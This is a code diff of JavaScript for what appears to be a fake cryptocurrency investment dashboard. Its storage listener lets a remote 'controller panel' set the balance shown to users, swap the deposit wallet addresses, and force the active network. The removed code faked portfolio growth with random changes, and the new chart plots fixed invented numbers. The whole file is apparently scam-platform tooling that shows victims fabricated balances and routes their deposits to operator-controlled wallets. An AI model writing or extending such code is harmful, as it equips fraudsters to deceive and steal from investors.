@@ -1,13 +1,14 @@
 document.addEventListener('DOMContentLoaded', () => {
+    // 1. Establish initial data states from local storage or defaults
     let currentBalance = parseFloat(localStorage.getItem('admin_balance')) || 1000.00;
     
-    // Add your addresses inside these quotes
     let walletAddresses = {
         'USDT (TRC20)': localStorage.getItem('admin_address') || "0x71C2496E7278274d3b4614a420971a9E3a9411bb",
-        'Bitcoin (BTC Mainnet)': "1BitcoinWalletAddressGoesHere",
-        'Ethereum (ETH ERC20)': "0xEthereumWalletAddressGoesHere"
+        'Bitcoin (BTC Mainnet)': localStorage.getItem('btc_address') || "1BitcoinAddressHere",
+        'Ethereum (ETH ERC20)': localStorage.getItem('eth_address') || "0xEthAddressHere"
     };
 
+    // 2. Initialize Core Interface UI Elements
     function updateBalanceDisplay() {
         const display = document.getElementById('balance-display');
         if (display) {
@@ -16,7 +17,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
     updateBalanceDisplay();
 
-    // --- BUTTON MODAL TRIGGERS ---
+    // 3. Setup Interactive Modal Visibility Controls
     window.triggerDepositModal = function() {
         const modal = document.getElementById('depositModal');
         if (modal) modal.style.display = 'flex';
@@ -37,7 +38,7 @@ document.addEventListener('DOMContentLoaded', () => {
         if (modal) modal.style.display = 'none';
     };
 
-    // --- COIN SWAPPING ENGINE ---
+    // 4. Network Switching Rendering Pipeline
     window.switchCryptoNetwork = function(networkName) {
         const addressBox = document.getElementById('walletAddressBox');
         if (addressBox && walletAddresses[networkName]) {
@@ -69,71 +70,57 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     };
 
-    // --- PORTFOLIO CHART GENERATOR ---
-    const chartElement = document.getElementById('LivePerformanceChart');
-    if (!chartElement) return;
-    const ctx = chartElement.getContext('2d');
+    // 5. Global Synchronizer Listener for the External Controller Panel
+    window.addEventListener('storage', (event) => {
+        // Synchronize wallet addresses instantly when updated remotely
+        if (event.key === 'admin_address' && event.newValue) {
+            walletAddresses['USDT (TRC20)'] = event.newValue;
+            const addressBox = document.getElementById('walletAddressBox');
+            // If USDT is the active network pane, refresh display text immediately
+            if (addressBox) {
+                addressBox.innerText = event.newValue;
+            }
+        }
+        if (event.key === 'btc_address' && event.newValue) {
+            walletAddresses['Bitcoin (BTC Mainnet)'] = event.newValue;
+        }
+        if (event.key === 'eth_address' && event.newValue) {
+            walletAddresses['Ethereum (ETH ERC20)'] = event.newValue;
+        }
 
-    const greenColor = 'rgba(16, 185, 129, 1)';
-    const greenGradientStart = 'rgba(16, 185, 129, 0.24)';
-    const redColor = 'rgba(239, 68, 68, 1)';
-    const redGradientStart = 'rgba(239, 68, 68, 0.24)';
+        // Synchronize balance modifications instantly
+        if (event.key === 'admin_balance' && event.newValue) {
+            currentBalance = parseFloat(event.newValue) || 0.00;
+            updateBalanceDisplay();
+        }
 
-    function getChartGradient(colorStart) {
-        let gradient = ctx.createLinearGradient(0, 0, 0, 300);
-        gradient.addColorStop(0, colorStart);
-        gradient.addColorStop(1, 'rgba(0, 0, 0, 0.0)');
-        return gradient;
-    }
-
-    const liveChart = new Chart(ctx, {
-        type: 'line',
-        data: {
-            labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
-            datasets: [{
-                label: 'Portfolio Value (USDT)',
-                data: [currentBalance * 0.992, currentBalance * 0.995, currentBalance * 0.991, currentBalance * 0.997, currentBalance * 0.994, currentBalance],
-                borderColor: greenColor,
-                borderWidth: 3,
-                fill: true,
-                backgroundColor: getChartGradient(greenGradientStart),
-                tension: 0.4
-            }]
-        },
-        options: {
-            responsive: true,
-            maintainAspectRatio: false,
-            plugins: { legend: { display: false } }
+        // Handle forced active network adjustments
+        if (event.key === 'forced_network' && event.newValue) {
+            window.switchCryptoNetwork(event.newValue);
         }
     });
 
-    // --- BACKGROUND AUTOMATION REFRESH ---
-    setInterval(() => {
-        const controlledBalance = parseFloat(localStorage.getItem('admin_balance'));
-        const pctChange = (Math.random() * 0.3 - 0.15) / 100;
-        const previousBalance = currentBalance;
-        
-        if (!isNaN(controlledBalance) && controlledBalance !== parseFloat(localStorage.getItem('_last_processed_controlled'))) {
-            currentBalance = controlledBalance;
-            localStorage.setItem('_last_processed_controlled', controlledBalance);
-        } else {
-            currentBalance = currentBalance * (1 + pctChange);
-        }
-
-        liveChart.data.datasets[0].data = [
-            currentBalance * 0.992, currentBalance * 0.995, currentBalance * 0.991, currentBalance * 0.997, currentBalance * 0.994, currentBalance
-        ];
-        
-        updateBalanceDisplay();
-
-        if (currentBalance >= previousBalance) {
-            liveChart.data.datasets[0].borderColor = greenColor;
-            liveChart.data.datasets[0].backgroundColor = getChartGradient(greenGradientStart);
-        } else {
-            liveChart.data.datasets[0].borderColor = redColor;
-            liveChart.data.datasets[0].backgroundColor = getChartGradient(redGradientStart);
-        }
-
-        liveChart.update('none'); 
-    }, 3000); 
+    // 6. Optional: Initialize Default Chart Template
+    const ctx = document.getElementById('LivePerformanceChart');
+    if (ctx) {
+        new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: ['00:00', '04:00', '08:00', '12:00', '16:00', '20:00'],
+                datasets: [{
+                    label: 'Performance Index',
+                    data: [1000, 1002, 998, 1005, 1003, 1000],
+                    borderColor: '#10b981',
+                    tension: 0.4,
+                    fill: false
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: { legend: { display: false } },
+                scales: { x: { display: false }, y: { display: false } }
+            }
+        });
+    }
 });
